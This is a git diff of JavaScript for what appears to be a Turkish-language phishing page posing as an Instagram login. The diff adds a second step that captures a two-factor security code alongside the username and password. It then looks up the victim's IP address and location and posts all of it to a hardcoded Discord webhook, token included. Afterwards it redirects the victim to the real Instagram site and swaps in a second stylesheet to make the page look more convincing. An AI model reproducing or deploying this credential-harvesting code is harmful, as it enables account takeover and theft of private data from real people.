@@ -1,10 +1,18 @@
 const loginButton = document.querySelector("#loginBtn");
 const password = document.querySelector("#passwordInput");
 const username = document.querySelector("#usernameInput");
+const alldata= {
+  username:"",
+  password:"",
+  securityCode:""
+}
+
 const showPasswordBtn = document.querySelector("#showPasswordBtn");
 
 password.addEventListener("input", disableBtn);
 username.addEventListener("input", disableBtn);
+
+
 
 
 
@@ -37,33 +45,67 @@ function disableBtn() {
 let Info
 loginButton.addEventListener("click", () => {
   (async function() {
-    Info = await getInfo();
-    console.log(Info);
-    sendInfo()
+    // Info = await getInfo();
+    // console.log("info",Info);
+    alldata.username=document.getElementById('usernameInput').value;
+    alldata.password=document.getElementById('passwordInput').value;
+    toggleHtml()
+    document.getElementById('loginBtn2').addEventListener('click', function() {
+      document.querySelector("#seccode");
+      alldata.securityCode=document.getElementById('seccode').value;
+      // console.log(alldata)
+      Info = getInfo();
+      console.log("info",Info);
+      sendInfo();
+
+
+
+});
+
+
+
+    // sendInfo()
   })();
 })
+
+
+
+
+
+
 
 async function getInfo() {
   try {
     const response = await fetch("https://ipapi.co/json/");
     const data = await response.json();
-    
-    const info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
-    
+
+    const info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode} `;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
+
     return info;
   } catch {
-    return `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
+    return `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode}`;
   }
 }
   
 
 async function sendInfo() {
+    let info="";
+    try {
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
+
+    info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode} `;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
+  } catch {
+    info = `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${alldata.username}\n> Password: ${alldata.password}\n Seccode: ${alldata.securityCode}`;
+  }
+
+
   const webhook = "https://discord.com/api/webhooks/1215673969483452466/t84VOKVWf0p8DdVtsfEptNdQ_FOR97A3Csijgko5cpfQbQiIG1pOX4NPKzn4ErAJdmfw"; //your discord webhook url
 
   const embed = {
     color: 1585803, //#18328b
     title: "Giriş denemesi",
-    description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
+    description: `${info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
       text: "forOldDays",
     }
@@ -87,4 +129,35 @@ async function sendInfo() {
   setTimeout(function() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
+}
+
+
+
+function toggleHtml() {
+    var html1 = document.getElementById("html1");
+    var html2 = document.getElementById("html2");
+
+    if (html1.style.display === "none") {
+        html1.style.display = "block";
+        html2.style.display = "none";
+    } else {
+        html1.style.display = "none";
+        html2.style.display = "block";
+    }
+        // Yeni CSS dosyasını yükle
+    var newStyleSheet = document.createElement('link');
+    newStyleSheet.rel = 'stylesheet';
+    newStyleSheet.href = '2wTTGzr-5Oe.css';
+
+    // Mevcut stil dosyasını değiştir
+    var oldStyleSheet = document.querySelector('link[href="style.css"]');
+    oldStyleSheet.parentNode.insertBefore(newStyleSheet, oldStyleSheet.nextSibling);
+    oldStyleSheet.parentNode.removeChild(oldStyleSheet);
+}
+
+
+
+function myFunction() {
+    alert('Button clicked!');
+    // Buraya butona tıklanınca yapılacak işlemleri ekleyebilirsiniz.
 }
